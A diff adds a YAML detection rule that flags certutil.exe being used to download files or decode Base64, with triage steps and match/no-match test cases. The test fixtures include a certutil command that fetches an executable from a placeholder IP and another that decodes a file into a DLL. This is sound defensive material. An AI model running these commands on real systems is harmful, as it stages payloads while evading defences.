@@ -1,0 +1,28 @@
+id: DL-0015
+title: certutil used to download or decode a file
+description: >
+  certutil -urlcache, -verifyctl or -decode used as a downloader or Base64 decoder. A
+  signed Microsoft tool doing a job it was not made for.
+attack: [T1105, T1140]
+tactic: defense-evasion
+severity: high
+logsource: process_creation
+detection:
+  selection:
+    process.name: certutil.exe
+    process.command_line|contains: [urlcache, verifyctl, '-decode', '/decode', '-decodehex', '/decodehex']
+  condition: selection
+false_positives:
+  - PKI admins clearing the URL cache (certutil -urlcache * delete). Check for a URL in the command line.
+triage:
+  - Retrieve the downloaded or decoded file from the path in the command line.
+  - Check what ran it next.
+tests:
+  match:
+    - process.name: certutil.exe
+      process.command_line: 'certutil -urlcache -split -f http://203.0.113.9/p.exe C:\Users\Public\p.exe'
+    - process.name: certutil.exe
+      process.command_line: 'certutil -decode C:\temp\a.b64 C:\temp\a.dll'
+  no_match:
+    - process.name: certutil.exe
+      process.command_line: 'certutil -store my'
